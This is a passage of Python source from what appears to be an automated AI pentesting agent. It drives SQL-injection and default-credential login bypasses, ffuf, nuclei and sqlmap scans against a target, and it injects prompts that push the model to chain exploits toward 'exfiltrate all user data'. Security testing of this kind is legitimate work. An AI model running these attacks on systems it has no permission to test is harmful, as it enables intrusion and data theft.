                                            # BrowserPage.press(key) takes ONLY a key — to send Enter
                                            # to a specific field we must hit the underlying page.
                                            if await _click_any(_submit_sels) is None:
                                                try:
                                                    await _bp._page.press(_pw_sel, "Enter")
                                                except Exception:
                                                    pass
                                            await _aio.sleep(2)
                                            snap = await _bp.snapshot()

                                            # Check for session token
                                            token_cookies = [c for c in snap.cookies if "token" in c.get("name", "").lower()]
                                            if token_cookies:
                                                # Extract JWT payload
                                                jwt_payload = ""
                                                try:
                                                    jwt_data = await _bp.evaluate(
                                                        "try { JSON.parse(atob(localStorage.getItem('token').split('.')[1])) } catch(e) { null }"
                                                    )
                                                    if jwt_data:
                                                        import json as _jm
                                                        jwt_payload = _jm.dumps(jwt_data, default=str)[:500]
                                                except Exception:
                                                    pass

                                                finding_msg = (
                                                    f"AUTO-EXPLOIT: Login succeeded with credentials "
                                                    f"email='{email}' password='{pwd}'!\n"
                                                    f"Session cookies: {[c.get('name') for c in token_cookies]}\n"
                                                )
                                                if jwt_payload:
                                                    finding_msg += f"JWT payload: {jwt_payload}\n"
                                                if "OR 1=1" in email:
                                                    finding_msg += (
                                                        "\nThis is SQL INJECTION authentication bypass — "
                                                        "CRITICAL severity. The login form is injectable.\n"
                                                    )
                                                self.state.add_message("user", finding_msg)
                                                logger.info("auto-login SUCCESS: %s → token found, JWT=%s",
                                                           email, jwt_payload[:100])

                                                # Auto-report this finding
                                                evidence = (
                                                    f"Login with email='{email}' password='{pwd}' "
                                                    f"resulted in authenticated session.\n"
                                                    f"Cookies: {snap.cookies}\n"
                                                    f"JWT: {jwt_payload}\n"
                                                    f"Redirected to: {snap.url}"
                                                )
                                                severity = "critical" if "OR 1=1" in email else "high"
                                                ftype = "sql_injection" if "OR 1=1" in email else "weak_auth"
                                                await self.registry.dispatch("report_finding", {
                                                    "title": f"Authentication bypass via {'SQLi' if 'OR 1=1' in email else 'default credentials'} on login form",
                                                    "severity": severity,
                                                    "finding_type": ftype,
                                                    "affected_component": _login_target,
                                                    "description": finding_msg,
                                                    "evidence": evidence,
                                                })
                                                _login_success = True
                                                break
                                            else:
                                                # No token cookie — credential combo didn't authenticate.
                                                _login_failures.append(f"{email}:no_session_cookie")
                                        except Exception as _le:
                                            logger.debug("auto-login attempt %s failed: %s", email, _le)
                                            _login_failures.append(f"{email}:exception_{type(_le).__name__}")

                                    # If every credential failed, tell Brain explicitly so it
                                    # pivots instead of letting the attempt fail silently.
                                    # Without this message, Brain would have no signal that
                                    # auto-login was even tried, let alone that it exhausted
                                    # 9 credential combos.
                                    if not _login_success:
                                        _fail_summary = (
                                            f"AUTO-LOGIN EXHAUSTED: tried {len(_login_creds)} credential "
                                            f"combos against {_login_target}, NONE succeeded. "
                                            f"Reasons (first 5): {_login_failures[:5]}. "
                                            f"PIVOT NOW — do not retry auto-login. Options: "
                                            f"(a) run_skill test_auth_deep (JWT alg:none, RS256→HS256, session fixation) "
                                            f"(b) run_skill test_injection on the login URL with param=email/username "
                                            f"(c) run_skill enumerate_endpoints + attack non-auth surface "
                                            f"(d) if target has a registration page, register a real account first. "
                                            f"Discovered form inputs: user_sels={_user_sels[:3]}, pw_sels={_pw_sels[:3]}."
                                        )
                                        self.state.add_message("user", _fail_summary)
                                        logger.warning(
                                            "auto-login exhausted after %d creds on %s — telling Brain to pivot",
                                            len(_login_creds), _login_target,
                                        )
                            except Exception:
                                logger.exception("auto-login failed")
                        logger.info("auto-browser-recon completed at iter %d", self.state.iteration)
                except Exception:
                    logger.exception("auto-browser-recon failed")

            # Auto-ffuf: directory bruteforce at iter 10
            if (
                not getattr(self, '_auto_ffuf_done', False)
                and self.state.iteration >= 10
                and "shell_exec" in self.registry.list_tools()
            ):
                ffuf_ran = any(
                    m.get("role") == "tool"
                    and isinstance(m.get("content"), dict)
                    and m["content"].get("name") == "shell_exec"
                    and "ffuf" in str(m["content"].get("args", ""))
                    for m in self.state.messages
                )
                if not ffuf_ran:
                    self._auto_ffuf_done = True
                    try:
                        # Get baseline size for SPA filtering
                        bs_filter = ""
                        if _baseline_size is not None:
                            bs_filter = f"-fs {_baseline_size} "
                        ffuf_cmd = (
                            f"ffuf -u {self.state.target}/FUZZ "
                            f"-w /usr/share/dirb/wordlists/common.txt "
                            f"{bs_filter}"
                            f"-mc 200,301,302,403 "
                            f"-t 20 -timeout 5 -s 2>&1 | head -30"
                        )
                        logger.info("auto-ffuf starting at iter %d", self.state.iteration)
                        fr = await self.registry.dispatch("shell_exec", {
                            "command": ffuf_cmd, "timeout": 60,
                        })
                        if fr.ok:
                            stdout = str(fr.data.get("stdout", "")) if fr.data else ""
                            if stdout.strip():
                                self.state.add_message("tool", {
                                    "name": "shell_exec",
                                    "args": {"command": "ffuf directory scan"},
                                    "result": {"ok": True, "summary": fr.summary, "data": fr.data},
                                })
                                self.state.add_message("user", (
                                    "AUTO-RECON: ffuf found these paths:\n"
                                    + stdout[:1500] + "\n\n"
                                    "Navigate to each path with browser_navigate or "
                                    "http_request and assess for vulnerabilities."
                                ))
                            logger.info("auto-ffuf completed at iter %d (%d bytes)",
                                       self.state.iteration, len(stdout))
                    except Exception:
                        logger.exception("auto-ffuf failed")

            # Auto-nuclei: if Brain hasn't run nuclei by iter 12, fire it
            if (
                not _auto_nuclei_done
                and self.state.iteration >= 12
                and "shell_exec" in self.registry.list_tools()
            ):
                # Check if Brain or auto already ran nuclei — look for
                # actual shell_exec tool calls with "nuclei" in args only
                nuclei_ran = any(
                    m.get("role") == "tool"
                    and isinstance(m.get("content"), dict)
                    and m["content"].get("name") == "shell_exec"
                    and "nuclei" in str(m["content"].get("args", ""))
                    for m in self.state.messages
                )
                if not nuclei_ran:
                    _auto_nuclei_done = True
                    logger.info("auto-nuclei: firing at iter %d", self.state.iteration)
                    try:
                        nuclei_cmd = (
                            f"nuclei -u {self.state.target} "
                            "-t /root/nuclei-templates/http/exposures/ "
                            "-t /root/nuclei-templates/http/default-logins/ "
                            "-t /root/nuclei-templates/http/exposed-panels/ "
                            "-t /root/nuclei-templates/http/cves/ "
                            "-t /root/nuclei-templates/http/misconfiguration/ "
                            "-severity critical,high,medium "
                            "-silent -nc -timeout 5 -retries 1 "
                            "-rate-limit 100"
                        )
                        nr = await self.registry.dispatch("shell_exec", {
                            "command": nuclei_cmd, "timeout": 120,
                        })
                        if nr.ok:
                            self.state.add_message("tool", {
                                "name": "shell_exec",
                                "args": {"command": "nuclei scan"},
                                "result": {"ok": True, "summary": nr.summary, "data": nr.data},
                            })
                            stdout = ""
                            if isinstance(nr.data, dict):
                                stdout = str(nr.data.get("stdout", ""))
                            if stdout.strip():
                                self.state.add_message("user", (
                                    "AUTO-RECON: nuclei found results! Analyze each line "
                                    "and report_finding for confirmed vulnerabilities:\n"
                                    + stdout[:2000]
                                ))
                            logger.info("auto-nuclei completed at iter %d (%d bytes output)",
                                       self.state.iteration, len(stdout))
                    except Exception:
                        logger.exception("auto-nuclei failed")

            # Auto-sqlmap: at iter 18+, if findings exist with 500 errors
            # and Brain hasn't run sqlmap, auto-fire on the best target
            if (
                not getattr(self, '_auto_sqlmap_done', False)
                and self.state.iteration >= 18
                and "shell_exec" in self.registry.list_tools()
            ):
                try:
                    from vxis.agent.tools.finding_tools import _get_findings
                    current_findings = _get_findings()
                except Exception:
                    current_findings = []

                # Find endpoints with error responses (500s = likely injectable)
                sqlmap_targets = []
                for f in current_findings:
                    comp = f.get("affected_component", "")
                    title = f.get("title", "")
                    if ("500" in title or "error" in f.get("finding_type", "")) and comp.startswith("http"):
                        sqlmap_targets.append(comp)

                sqlmap_ran = any(
                    m.get("role") == "tool"
                    and isinstance(m.get("content"), dict)
                    and m["content"].get("name") == "shell_exec"
                    and "sqlmap" in str(m["content"].get("args", ""))
                    for m in self.state.messages
                )

                if sqlmap_targets and not sqlmap_ran:
                    self._auto_sqlmap_done = True
                    target_url = sqlmap_targets[0]
                    # Add query param if none exists (sqlmap needs injectable param)
                    if "?" not in target_url:
                        target_url += "?q=test"
                    try:
                        sqlmap_cmd = (
                            f"sqlmap -u '{target_url}' "
                            "--batch --level=2 --risk=2 "
                            "--threads=4 --timeout=10 "
                            "--output-dir=/tmp/sqlmap_auto "
                            "2>&1 | tail -50"
                        )
                        logger.info("auto-sqlmap firing on %s", target_url)
                        sr = await self.registry.dispatch("shell_exec", {
                            "command": sqlmap_cmd, "timeout": 180,
                        })
                        if sr.ok:
                            stdout = str(sr.data.get("stdout", "")) if sr.data else ""
                            self.state.add_message("tool", {
                                "name": "shell_exec",
                                "args": {"command": f"sqlmap -u '{target_url}' --batch"},
                                "result": {"ok": True, "summary": sr.summary, "data": sr.data},
                            })
                            # Parse sqlmap output for injectable params
                            is_injectable = any(
                                kw in stdout.lower()
                                for kw in ["is vulnerable", "injectable", "payload:", "type:"]
                            )
                            if is_injectable:
                                # Auto-report — don't ask Brain, it won't do it
                                await self.registry.dispatch("report_finding", {
                                    "title": f"SQL Injection confirmed by sqlmap on {target_url.split('?')[0]}",
                                    "severity": "critical",
                                    "finding_type": "sql_injection",
                                    "affected_component": target_url,
                                    "description": (
                                        f"sqlmap --batch confirmed SQL injection.\n"
                                        f"Target: {target_url}\n"
                                        f"Evidence:\n{stdout[:1500]}"
                                    ),
                                    "evidence": stdout[:2000],
                                })
                                self.state.add_message("user", (
                                    f"AUTO-EXPLOIT: sqlmap confirmed SQL injection on {target_url}!\n"
                                    "Finding auto-reported as CRITICAL sql_injection."
                                ))
                                logger.info("auto-sqlmap FOUND injection on %s", target_url)
                            else:
                                self.state.add_message("user", (
                                    f"AUTO-EXPLOIT: sqlmap ran on {target_url} but did not "
                                    f"confirm injection. Output:\n{stdout[:1000]}\n\n"
                                    "Try different endpoints or parameters."
                                ))
                            logger.info("auto-sqlmap completed at iter %d", self.state.iteration)
                    except Exception:
                        logger.exception("auto-sqlmap failed")

            # ── Chain Analysis Nudge (persistent re-injection) ─────────
            # Brain-First: we keep nudging until chains are built. The nudge
            # is re-injected every 6 iters while chain pressure exists, so it
            # never gets buried in history. Brain decides HOW to chain; we
            # just keep the pressure on.
            try:
                from vxis.agent.tools.finding_tools import _get_findings, _get_chains
                _nudge_findings = _get_findings()
                _nudge_chains = _get_chains()
                _last_nudge_iter = getattr(self, '_last_chain_nudge_iter', -100)
                _nudge_gap = self.state.iteration - _last_nudge_iter
                _desired = max(3, len(_nudge_findings) // 3)
                _needs_chain = (
                    len(_nudge_findings) >= 3
                    and len(_nudge_chains) < _desired
                    and self.state.iteration >= 18
                    and _nudge_gap >= 6
                )
                if _needs_chain:
                    self._last_chain_nudge_iter = self.state.iteration
                    # Build a findings summary for Brain to reason about
                    f_summary = "\n".join(
                        f"  {f['id']} [{f.get('severity','?').upper()}] {f.get('finding_type','')}: {f.get('title','')[:60]}"
                        for f in _nudge_findings[:15]
                    )
                    # Concrete example pair from actual findings
                    _fid_a = _nudge_findings[0]["id"]
                    _fid_b = _nudge_findings[-1]["id"] if len(_nudge_findings) > 1 else _nudge_findings[0]["id"]
                    existing_str = ""
                    if _nudge_chains:
                        existing_str = (
                            f"\nYou already built {len(_nudge_chains)} chain(s):\n"
                            + "\n".join(
                                f"  {c.get('id')}: {' → '.join(c.get('finding_ids', []))}"
                                for c in _nudge_chains[:5]
                            )
                            + f"\n\nBuild {_desired - len(_nudge_chains)} MORE. Every combination.\n"
                        )
                    self.state.add_message("user", (
                        "═══ CHAIN ANALYSIS PHASE — DO NOT finish_scan ═══\n\n"
                        f"Findings: {len(_nudge_findings)} | Chains: {len(_nudge_chains)} / {_desired} target\n\n"
                        f"YOUR FINDINGS:\n{f_summary}\n"
                        f"{existing_str}\n"
                        "A chain = one finding's output feeds into the next exploit.\n"
                        "Example: SQLi dumps admin creds → log in → access admin panel → "
                        "find IDOR → exfiltrate all user data.\n\n"
                        "CONCRETE ACTION you can take RIGHT NOW:\n"
                        f'  link_chain(finding_ids=["{_fid_a}", "{_fid_b}"], '
                        f'rationale="<why these compose>", '
                        f'crown_jewel="<admin takeover | DB dump | RCE | data exfil>")\n\n'
                        "For EACH chain:\n"
                        "  1. TRY IT — use tools to prove the chain works.\n"
                        "  2. Call link_chain with the finding IDs + rationale + crown jewel.\n"
                        "  3. Move to the next combination.\n\n"
                        "Think creatively. Combine findings in every way you can imagine. "
                        "The more chains you build, the better the report."
                    ))
                    logger.info(
                        "chain nudge re-injected at iter %d (%d findings, %d chains, target %d)",
                        self.state.iteration, len(_nudge_findings),
                        len(_nudge_chains), _desired,
                    )
            except Exception:
                logger.exception("chain nudge failed")

            # ── Skill sweep: force untried skills ──────────────────────
            # Without this, skills that require URL-with-params (test_xss,
            # test_ssrf), a token (test_auth_deep), or an id_pattern
            # (test_idor) can go completely unattempted when enumerate
            # doesn't find suitable endpoints or auth doesn't succeed.
            # Result: vector_coverage caps low.
            #
            # At iter ≥ 25 and every 10 iters thereafter, queue every
            # untried registry skill with a generic default. Brain still
            # sees each result and decides how to escalate.
            try:
                if self.state.iteration >= 25 and "run_skill" in self.registry.list_tools():
                    _last_sweep = getattr(self, '_last_skill_sweep_iter', -100)
                    _sweep_gap = self.state.iteration - _last_sweep
                    if _sweep_gap >= 10:
                        from vxis.agent.skills import SKILL_REGISTRY as _REG
                        from vxis.interaction.surface import TargetKind as _TK
                        # Filter the registry to skills that match the surface
                        # kind. The 6 desktop skills have macOS-specific code
                        # paths (codesign, otool, plistlib) that crash or
                        # return empty on web targets. Conversely, web skills
                        # on a desktop target waste iters firing HTTP at a
                        # file:// path. Naming convention: desktop skills
                        # live under skills/desktop/ and have no web siblings.
                        _DESKTOP_ONLY = {
                            "test_local_storage_secrets",
                            "test_electron_misconfig",
                            "test_signature_audit",
                            "test_entitlement_audit",
                            "test_dylib_hijack",
                            "test_deeplink_abuse",
                        }
                        _all_registered = set(_REG.keys())
                        if self._target_kind == _TK.DESKTOP:
                            _eligible = _all_registered & _DESKTOP_ONLY
                        else:
                            _eligible = _all_registered - _DESKTOP_ONLY
                        _untried = sorted(_eligible - _real_skills_completed)
                        if _untried:
                            self._last_skill_sweep_iter = self.state.iteration
                            _base = self.state.target.rstrip("/")
                            # Best-guess defaults for skills that need more
                            # than target_url. Pick params generic enough to
                            # at least exercise the skill path — Brain will
                            # re-run with better args once it sees results.
                            _defaults: dict[str, dict] = {
                                "test_injection": {"url": f"{_base}/search?q=test"},
                                "test_xss": {"url": f"{_base}/search?q=test"},
                                "test_ssrf": {"url": f"{_base}/redirect?url=http://example.com"},
                                "test_idor": {"url_pattern": f"{_base}/api/users/{{id}}"},
                                "post_auth_enum": {"token": _auth_token or ""},
                                "test_auth_deep": {"token": _auth_token},
                                "test_csrf": {"token": _auth_token},
                                "test_api_security": {"token": _auth_token},
                                "test_business_logic": {"token": _auth_token},
                            }
                            _queued = 0
                            for sk in _untried:
                                params = dict(_defaults.get(sk, {}))
                                params["_skill_override"] = sk
                                _alias = f"{sk}__sweep{self.state.iteration}"
                                _skill_sequence.append(
                                    (_alias, self.state.iteration + 1, params)
                                )
                                _all_skill_names.add(_alias)
                                _queued += 1
                            self.state.add_message("user", (
                                f"SKILL SWEEP at iter {self.state.iteration}: "
                                f"{_queued} untried skills queued ({', '.join(_untried[:8])}"
                                f"{'...' if len(_untried) > 8 else ''}). "
                                "Vector coverage was dropping — these will run on upcoming iters "
                                "with generic defaults. Watch the results and refine with targeted "
                                "args if any look promising."
                            ))
                            logger.info(
                                "skill sweep iter %d: queued %d untried: %s",
                                self.state.iteration, _queued, _untried,
                            )
            except Exception:
                logger.exception("skill sweep failed")

            # Strategic Director: every N iterations, a stronger model (gpt-5.4)
            # decides the EXACT next tool call and the scan loop executes it
            # directly. This is the hybrid brain pattern — strong model for
            # strategy, weak model for routine.
            if (
                not self.state.completed
                and self.critic_interval > 0
                and self.state.iteration - self._last_critic_iter >= self.critic_interval
                and self.state.iteration < self.state.max_iters - 2
            ):
                self._last_critic_iter = self.state.iteration
                try:
                    director_action = await self._director_decide()
                except Exception:
                    logger.exception("director_decide raised")
                    director_action = None
                if director_action:
                    d_name, d_args = director_action
                    # Dedup: don't let director repeat the same call
                    try:
                        d_key = f"{d_name}::{_json.dumps(d_args, sort_keys=True, default=str)}"
                    except Exception:
                        d_key = f"{d_name}::{d_args!r}"
                    d_count = _call_counts.get(d_key, 0)
                    if d_count >= 3:
                        logger.warning("iter %d: director dedup-blocked %s", self.state.iteration, d_name)
                    else:
                        _call_counts[d_key] = d_count + 1
                        try:
                            d_result = await self.registry.dispatch(d_name, d_args)
                            self.state.add_message("tool", {
                                "name": d_name,
                                "args": d_args,
                                "result": {
                                    "ok": d_result.ok,
                                    "summary": f"[DIRECTOR] {d_result.summary}",
                                    "data": d_result.data,
                                },
                            })
                            logger.info(
                                "iter %d: director executed %s → %s",
                                self.state.iteration, d_name,
                                "ok" if d_result.ok else "fail",
                            )
                            # Auto-analyze director results for findings
                            if d_result.ok and d_name in ("http_request", "shell_exec", "python_exec"):
                                data = d_result.data or {}
                                stdout = str(data.get("stdout", data.get("body", "")))[:2000]
                                status = data.get("status_code", data.get("exit_code", 0))
                                if stdout and (
                                    "vulnerable" in stdout.lower()
                                    or "injectable" in stdout.lower()
                                    or "payload:" in stdout.lower()
                                    or (isinstance(status, int) and status == 500)
                                ):
                                    self.state.add_message("user", (
                                        f"DIRECTOR RESULT ANALYSIS: {d_name} on "
                                        f"{d_args.get('url', d_args.get('command',''))[:80]} "
                                        f"returned interesting data (status={status}). "
                                        f"Output: {stdout[:500]}\n"
                                        "If this is a real vulnerability, call report_finding."
                                    ))
                        except Exception:
                            logger.exception("director action dispatch failed")
        return {
            "target": self.state.target,
            "completed": self.state.completed,
            "iterations": self.state.iteration,
            "findings": self.state.findings,
            "messages": len(self.state.messages),
            "peak_context_bytes": self.state.peak_context_bytes,
            "verdict_counts": dict(self.state.verdict_counts),
            "confirmed_findings": list(self.state.confirmed_findings),
            "refuted_findings": list(self.state.refuted_findings),
            "skills_completed": list(_skills_completed),
            "sandbox_invocations": list(_sandbox_invocations),
        }
